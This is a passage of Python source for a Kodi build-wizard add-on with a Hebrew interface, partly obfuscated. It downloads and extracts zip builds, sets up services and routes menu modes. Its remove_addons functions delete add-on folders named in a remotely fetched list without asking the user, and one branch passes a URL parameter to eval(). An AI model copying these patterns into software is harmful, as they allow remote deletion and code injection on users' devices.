
    if header:
          total_size = int(total_size)

    bytes_so_far = 0
    start_time=time.time()
    while True:
          buffer = remote_file.read(8192)
          if not buffer:
              sys.stdout.write('\n')
              break

          bytes_so_far += len(buffer)
          f.write(buffer)

          if not header:
              total_size = bytes_so_far # unknown size
          if dp.iscanceled(): 
             dp.close()
             try:
              os.remove(OOooO)
             except:
              pass
             break
          percent = float(bytes_so_far) / total_size
          percent = round(percent*100, 2)
          currently_downloaded=bytes_so_far/ (1024 * 1024) 
          total=total_size/ (1024 * 1024) 
          mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
          if (time.time() - start_time) >0:
            kbps_speed = bytes_so_far / (time.time() - start_time) 
            kbps_speed = kbps_speed / 1024 
          else:
           kbps_speed=0
          type_speed = 'KB'
          if kbps_speed >= 1024:
             kbps_speed = kbps_speed / 1024 
             type_speed = 'MB'
          if kbps_speed > 0 and not percent == 100: 
              eta = (total_size - bytes_so_far) / kbps_speed 
          else: 
              eta = 0
          e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

          dp.update(int(percent),mbs,e+ "[B][COLOR=yellow]מוריד.... [/COLOR][/B]"  )
          #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
    II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/' ) )

     
    f.close()
    extract.all  ( OOooO , II111iiii,dp )
  
   # extract.all(lib, HOME,DP)

    try:
      os.remove(OOooO)
    except:
      pass
def telemedia_android5fix():
    android=ADDON.getSetting('systemtype')
    teleandro=ADDON.getSetting('teleandro')
    if xbmc.getCondVisibility('system.platform.android') and 'Android 5' in android or teleandro =='true':

        link= 'https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'
        iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
        iiiI11 = xbmcgui . DialogProgress ( )
        iiiI11 . create ( "[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]" , "[B][COLOR=green]מוריד....[/COLOR][/B]"  '' , 'אנא המתן' )
        OOooO = os . path . join ( PACKAGES , 'isr.zip' )
        req = urllib2.Request(link)
        remote_file = urllib2.urlopen(req)
        #the_page = response.read()
        dp = xbmcgui.DialogProgress()
        dp.create("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]", "[B][COLOR=green]מוריד....[/COLOR][/B]")
        dp.update(0)

        f = open(OOooO, 'wb')

        try:
          total_size = remote_file.info().getheader('Content-Length').strip()
          header = True
        except AttributeError:
              header = False # a response doesn't always include the "Content-Length" header

        if header:
              total_size = int(total_size)

        bytes_so_far = 0
        start_time=time.time()
        while True:
              buffer = remote_file.read(8192)
              if not buffer:
                  sys.stdout.write('\n')
                  break

              bytes_so_far += len(buffer)
              f.write(buffer)

              if not header:
                  total_size = bytes_so_far # unknown size
              if dp.iscanceled(): 
                 dp.close()
                 try:
                  os.remove(OOooO)
                 except:
                  pass
                 break
              percent = float(bytes_so_far) / total_size
              percent = round(percent*100, 2)
              currently_downloaded=bytes_so_far/ (1024 * 1024) 
              total=total_size/ (1024 * 1024) 
              mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
              if (time.time() - start_time) >0:
                kbps_speed = bytes_so_far / (time.time() - start_time) 
                kbps_speed = kbps_speed / 1024 
              else:
               kbps_speed=0
              type_speed = 'KB'
              if kbps_speed >= 1024:
                 kbps_speed = kbps_speed / 1024 
                 type_speed = 'MB'
              if kbps_speed > 0 and not percent == 100: 
                  eta = (total_size - bytes_so_far) / kbps_speed 
              else: 
                  eta = 0
              e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

              dp.update(int(percent),mbs,e+ "[B][COLOR=green]מוריד.... [/COLOR][/B]"  )
              #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
      
        II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )

         
        f.close()
        extract.all  ( OOooO , II111iiii,dp )
      
       # extract.all(lib, HOME,DP)

        try:
          os.remove(OOooO)
        except:
          pass


def testnotify():
	url = wiz.workingURL(NOTIFICATION)
	if url == True:
		try:
			id, msg = wiz.splitNotify(NOTIFICATION)
			if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2); return
			if STARTP2()=='ok': 
				notify.notification(msg, True)
		except Exception as e:
			wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2)
def testnotify2():
	url = wiz.workingURL(NOTIFICATION2)
	if url == True:
		try:
			id, msg = wiz.splitNotify(NOTIFICATION2)
			if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2); return
			if STARTP2()=='ok':
				notify.notification2(msg, True)
		except Exception as e:
			wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2)
def testnotify3():
	url = wiz.workingURL(NOTIFICATION3)
	if url == True:
		try:
			id, msg = wiz.splitNotify(NOTIFICATION3)
			if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2); return
			if STARTP2()=='ok':
				notify.notification3(msg, True)
		except Exception as e:
			wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2)
def wait():
 wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אנא המתן[/COLOR]" % COLOR2)
def infobuild():
	url = wiz.workingURL(NOTIFICATION)
	if url == True:
		try:
			id, msg = wiz.splitNotify(NOTIFICATION)
			if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2); return
			if STARTP2()=='ok': 
				notify.updateinfo(msg, True)
		except Exception as e:
			wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2)
def servicemanual():
	url = wiz.workingURL(HELPINFO)
	if url == True:
		try:
			id, msg = wiz.splitNotify(HELPINFO)
			if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Notification: Not Formated Correctly[/COLOR]" % COLOR2); return
			notify.helpinfo(msg, True)
		except Exception as e:
			wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Invalid URL for Notification[/COLOR]" % COLOR2)

def testupdate():
	if BUILDNAME == "":
		notify.updateWindow()
	else:
		notify.updateWindow(BUILDNAME, BUILDVERSION, BUILDLATEST, wiz.checkBuild(BUILDNAME, 'icon'), wiz.checkBuild(BUILDNAME, 'fanart'))

def testfirst():
	notify.firstRun()

def testfirstRun():
	notify.firstRunSettings()
	
	
def fastinstall():
	notify.firstRuninstall()
	

###########################
## Making the Directory####
###########################

def addDir(display, mode=None, name=None, url=None, menu=None, description=ADDONTITLE, overwrite=True, fanart=FANART, icon=ICON, themeit=None):
	u = sys.argv[0]
	if not mode == None: u += "?mode=%s" % urllib.quote_plus(mode)
	if not name == None: u += "&name="+urllib.quote_plus(name)
	if not url == None: u += "&url="+urllib.quote_plus(url)
	ok=True
	if themeit: display = themeit % display
	liz=xbmcgui.ListItem(display, iconImage="DefaultFolder.png", thumbnailImage=icon)
	liz.setInfo( type="Video", infoLabels={ "Title": display, "Plot": description} )
	liz.setProperty( "Fanart_Image", fanart )
	if not menu == None: liz.addContextMenuItems(menu, replaceItems=overwrite)
	ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
	return ok

def addFile(display, mode=None, name=None, url=None, menu=None, description=ADDONTITLE, overwrite=True, fanart=FANART, icon=ICON, themeit=None):
	u = sys.argv[0]
	if not mode == None: u += "?mode=%s" % urllib.quote_plus(mode)
	if not name == None: u += "&name="+urllib.quote_plus(name)
	if not url == None: u += "&url="+urllib.quote_plus(url)
	ok=True
	if themeit: display = themeit % display
	liz=xbmcgui.ListItem(display, iconImage="DefaultFolder.png", thumbnailImage=icon)
	liz.setInfo( type="Video", infoLabels={ "Title": display, "Plot": description} )
	liz.setProperty( "Fanart_Image", fanart )
	if not menu == None: liz.addContextMenuItems(menu, replaceItems=overwrite)
	ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
	return ok

def get_params():
	param=[]
	paramstring=sys.argv[2]
	if len(paramstring)>=2:
		params=sys.argv[2]
		cleanedparams=params.replace('?','')
		if (params[len(params)-1]=='/'):
			params=params[0:len(params)-2]
		pairsofparams=cleanedparams.split('&')
		param={}
		for i in range(len(pairsofparams)):
			splitparams={}
			splitparams=pairsofparams[i].split('=')
			if (len(splitparams))==2:
				param[splitparams[0]]=splitparams[1]

		return param

def remove_addons():
	try:
			import json
			r = urllib2.urlopen(remove_url).readlines()
			for line in r:
				
				add_name =line.split(':')[1].strip() 
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder=os.path.join(addons_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)

			xbmc.executebuiltin('Container.Refresh')
			xbmc.executebuiltin("XBMC.UpdateLocalAddons()")
			xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
	except:  pass
def remove_addons2():
	try:
			import json
			r = urllib2.urlopen(remove_url2).readlines()
			for line in r:
				
				add_name =line.split(':')[1].strip() 
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder2=os.path.join(user_folder,add_name)
				
				if os.path.exists(url_folder2):
					for root, dirs, files in os.walk(url_folder2):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder2)

	except:  pass
params=get_params()
url=None
name=None
mode=None

try:     mode=urllib.unquote_plus(params["mode"])
except:  pass
try:     name=urllib.unquote_plus(params["name"])
except:  pass
try:     url=urllib.unquote_plus(params["url"])
except:  pass
if not os.path.exists(os.path.join(ADDONDATA, '4.3.0')):
    try:
        file = open(os.path.join(ADDONDATA, '4.3.0'), 'w') 
         
        file.write(str('Done'))
        file.close()
        xbmc.getInfoLabel('System.OSVersionInfo')
        xbmc.sleep(2000)
        label = xbmc.getInfoLabel('System.OSVersionInfo')
        ADDON.setSetting('systemtype',label)
    except:pass
# wiz.log("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s" % mode)
def setView(content, viewType):
	if wiz.getS('auto-view')=='true':
		views = wiz.getS(viewType)
		if views == '50' and KODIV >= 17 and SKIN == 'skin.estuary': views = '55'
		if views == '500' and KODIV >= 17 and SKIN == 'skin.estuary': views = '50'
		wiz.ebi("Container.SetViewMode(%s)" %  views)

if   mode==None             : index()

elif mode=='wizardupdate'   : wiz.wizardUpdate()
elif mode=='builds'         : buildMenu()
elif mode=='viewbuild'      : viewBuild(name)
elif mode=='buildinfo'      : buildInfo(name)
elif mode=='buildpreview'   : buildVideo(name)
elif mode=='install'        : buildWizard(name, url)
elif mode=='theme'          : buildWizard(name, mode, url)
elif mode=='viewthirdparty' : viewThirdList(name)
elif mode=='installthird'   : thirdPartyInstall(name, url)
elif mode=='editthird'      : editThirdParty(name); wiz.refresh()

elif mode=='maint'          : maintMenu(name)
elif mode=='passpin'        :   passandpin()
elif mode=='backmyupbuild'  :   backmyupbuild()
elif mode=='kodi17fix'      : wiz.kodi17Fix()
elif mode=='kodi177fix'      : wiz.kodi177Fix()
elif mode=='advancedsetting': advancedWindow(name)
elif mode=='autoadvanced'   : showAutoAdvanced(); wiz.refresh()
elif mode=='removeadvanced' : removeAdvanced(); wiz.refresh()
elif mode=='asciicheck'     : wiz.asciiCheck()
elif mode=='backupbuild'    : wiz.backUpOptions('build')
elif mode=='backupgui'      : wiz.backUpOptions('guifix')
elif mode=='backuptheme'    : wiz.backUpOptions('theme')
elif mode=='backupaddon'    : wiz.backUpOptions('addondata')
elif mode=='oldThumbs'      : wiz.oldThumbs()
elif mode=='clearbackup'    : wiz.cleanupBackup()
elif mode=='convertpath'    : wiz.convertSpecial(HOME)
elif mode=='currentsettings': viewAdvanced()
elif mode=='fullclean'      : totalClean(); wiz.refresh()
elif mode=='clearcache'     : clearCache(); wiz.refresh()
elif mode=='fixwizard'      : fixwizard(); wiz.refresh()
elif mode=='fixskin'        : backtokodi()
elif mode=='testcommand'        : testcommand()
elif mode=='logsend'        : logsend()
elif mode=='rdon'           : rdon()
elif mode=='rdoff'          : rdoff()
elif mode=='setrd'          : setrealdebrid()
elif mode=='setrd2'         : setautorealdebrid()
elif mode=='clearpackages'  : wiz.clearPackages(); wiz.refresh()
elif mode=='clearcrash'     : wiz.clearCrash(); wiz.refresh()
elif mode=='clearthumb'     : clearThumb(); wiz.refresh()
elif mode=='checksources'   : wiz.checkSources(); wiz.refresh()
elif mode=='checkrepos'     : wiz.checkRepos(); wiz.refresh()
elif mode=='freshstart'     : freshStart()
elif mode=='forceupdate'    : wiz.forceUpdate()
elif mode=='forceprofile'   : wiz.reloadProfile(wiz.getInfo('System.ProfileName'))
elif mode=='forceclose'     : wiz.killxbmc()
elif mode=='forceskin'      : wiz.ebi("ReloadSkin()"); wiz.refresh()
elif mode=='hidepassword'   : wiz.hidePassword()
elif mode=='unhidepassword' : wiz.unhidePassword()
elif mode=='enableaddons'   : enableAddons()
elif mode=='toggleaddon'    : wiz.toggleAddon(name, url); wiz.refresh()
elif mode=='togglecache'    : toggleCache(name); wiz.refresh()
elif mode=='toggleadult'    : wiz.toggleAdult(); wiz.refresh()
elif mode=='changefeq'      : changeFeq(); wiz.refresh()
elif mode=='uploadlog'      : uploadLog.Main()
elif mode=='viewlog'        : LogViewer()
elif mode=='viewwizlog'     : LogViewer(WIZLOG)
elif mode=='viewerrorlog'   : errorChecking(all=True)
elif mode=='clearwizlog'    : f = open(WIZLOG, 'w'); f.close(); wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Wizard Log Cleared![/COLOR]" % COLOR2)
elif mode=='purgedb'        : purgeDb()
elif mode=='fixaddonupdate' : fixUpdate()
elif mode=='removeaddons'   : removeAddonMenu()
elif mode=='removeaddon'    : removeAddon(name)
elif mode=='removeaddondata': removeAddonDataMenu()
elif mode=='removedata'     : removeAddonData(name)
elif mode=='resetaddon'     : total = wiz.cleanHouse(ADDONDATA, ignore=True); wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Addon_Data reset[/COLOR]" % COLOR2)
elif mode=='systeminfo'     : systemInfo()
elif mode=='restorezip'     : restoreit('build')
elif mode=='restoregui'     : restoreit('gui')
elif mode=='restoreaddon'   : restoreit('addondata')
elif mode=='restoreextzip'  : restoreextit('build')
elif mode=='restoreextgui'  : restoreextit('gui')
elif mode=='restoreextaddon': restoreextit('addondata')
elif mode=='writeadvanced'  : writeAdvanced(name, url)
elif mode=='traktsync'  : traktsync()

elif mode=='apk'            : apkMenu(name)
elif mode=='apkscrape'      : apkScraper(name)
elif mode=='apkinstall'     : apkInstaller(name, url)
elif mode=='speed'          : speedMenu()
elif mode=='net'            : net_tools()
elif mode=='GetList'        : GetList(url)
elif mode=='youtube'        : youtubeMenu(name)
elif mode=='viewVideo'      : playVideo(url)

elif mode=='addons'         : addonMenu(name)
elif mode=='addoninstall'   : addonInstaller(name, url)

elif mode=='savedata'       : saveMenu()
elif mode=='togglesetting'  : wiz.setS(name, 'false' if wiz.getS(name) == 'true' else 'true'); wiz.refresh()
elif mode=='managedata'     : manageSaveData(name)
elif mode=='whitelist'      : wiz.whiteList(name)

elif mode=='trakt'          : traktMenu()
elif mode=='savetrakt'      : traktit.traktIt('update',      name)
elif mode=='restoretrakt'   : traktit.traktIt('restore',     name)
elif mode=='addontrakt'     : traktit.traktIt('clearaddon',  name)
elif mode=='cleartrakt'     : traktit.clearSaved(name)
elif mode=='authtrakt'      : traktit.activateTrakt(name); wiz.refresh()
elif mode=='updatetrakt'    : traktit.autoUpdate('all')
elif mode=='importtrakt'    : traktit.importlist(name); wiz.refresh()

elif mode=='realdebrid'     : realMenu()
elif mode=='savedebrid'     : debridit.debridIt('update',      name)
elif mode=='restoredebrid'  : debridit.debridIt('restore',     name)
elif mode=='addondebrid'    : debridit.debridIt('clearaddon',  name)
elif mode=='cleardebrid'    : debridit.clearSaved(name)
elif mode=='authdebrid'     : debridit.activateDebrid(name); wiz.refresh()
elif mode=='updatedebrid'   : debridit.autoUpdate('all')
elif mode=='importdebrid'   : debridit.importlist(name); wiz.refresh()

elif mode=='login'          : loginMenu()
elif mode=='savelogin'      : loginit.loginIt('update',      name)
elif mode=='restorelogin'   : loginit.loginIt('restore',     name)
elif mode=='addonlogin'     : loginit.loginIt('clearaddon',  name)
elif mode=='clearlogin'     : loginit.clearSaved(name)
elif mode=='authlogin'      : loginit.activateLogin(name); wiz.refresh()
elif mode=='updatelogin'    : loginit.autoUpdate('all')
elif mode=='importlogin'    : loginit.importlist(name); wiz.refresh()

elif mode=='contact'        : notify.contact(CONTACT)
elif mode=='settings'       : wiz.openS(name); wiz.refresh()
elif mode=='opensettings'   : id = eval(url.upper()+'ID')[name]['plugin']; addonid = wiz.addonId(id); addonid.openSettings(); wiz.refresh()

elif mode=='developer'      : developer()
elif mode=='converttext'    : wiz.convertText()
elif mode=='createqr'       : wiz.createQR()
elif mode=='testnotify'     : testnotify()
elif mode=='testnotify2'     : testnotify2()
elif mode=='servicemanual'     : servicemanual()
elif mode=='fastinstall'     : fastinstall()
elif mode=='testupdate'     : testupdate()
elif mode=='testfirst'      : testfirst()
elif mode=='testfirstrun'   : testfirstRun()
elif mode=='testapk'        : notify.apkInstaller('SPMC')

elif mode=='bg'        : wiz.bg_install(name,url)
elif mode=='bgcustom'        : wiz.bg_custom()
elif mode=='bgremove'        : wiz.bg_remove()
elif mode=='bgdefault'        : wiz.bg_default()
elif mode=='rdset'        : rdsetup()
elif mode=='mor'        : morsetup()
elif mode=='mor2'        : morsetup2()
elif mode=='firstinstall'        : firstinstall()
elif mode=='resolveurl'        : resolveurlsetup()
elif mode=='urlresolver'        : urlresolversetup()
elif mode=='forcefastupdate'        : forcefastupdate()
elif mode=='traktset'        : traktsetup()
elif mode=='placentaset'        : placentasetup()
elif mode=='flixnetset'        : flixnetsetup()
elif mode=='reptiliaset'        : reptiliasetup()
elif mode=='yodasset'        : yodasetup()
elif mode=='numbersset'        : numberssetup()
elif mode=='uranusset'        : uranussetup()
elif mode=='genesisset'        : genesissetup()
elif mode=='fastupdate'        : fastupdate()
elif mode=='folderback'        : folderback()
elif mode=='menudata'        : Menu()
elif mode=='infoupdate'        : infobuild()
elif mode=='wait'        : wait()
elif mode==2:
        wiz.torent_menu()
elif mode==3:
        wiz.popcorn_menu()
elif mode==8:
        wiz.metaliq_fix()
elif mode==9:
        wiz.quasar_menu()
elif mode==5:
        swapSkins('skin.Premium.mod')
elif mode==13:
        wiz.elementum_menu()
elif mode==16:
        wiz.fix_wizard()
elif mode==17:
        wiz.last_play()
elif mode==18:
        wiz.normal_metalliq()
elif mode==19:
        wiz.fast_metalliq()
elif mode==20:
        wiz.fix_buffer2()
elif mode==21:
        wiz.fix_buffer3()
elif mode==11:
        wiz.fix_buffer()
elif mode==15:
        wiz.fix_font()
elif mode==14:
        wiz.clean_pass()
elif mode==22:
        wiz.movie_update()


elif mode=='simpleiptv':

    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם תרצה להגדיר את חשבון ה IPTV?", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
        iptvkodi17_18() 
        
    else:
     sys.exit()

elif mode=='simpleidanplus':
    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
        iptvidanplus()
        
    else:
     sys.exit()

elif mode=='update_tele'   :updatetelemedia(NOTEID)
elif mode=='adv_settings'   : buffer1()
elif mode=='getpass'        : getpass()
elif mode=='setpass'        : setpass()
elif mode=='setuname'       : setuname()
elif mode=='passandUsername'       : passandUsername()
elif mode=='9'        : disply_hwr()
elif mode=='99'        : disply_hwr2()
xbmcplugin.endOfDirectory(int(sys.argv[1]))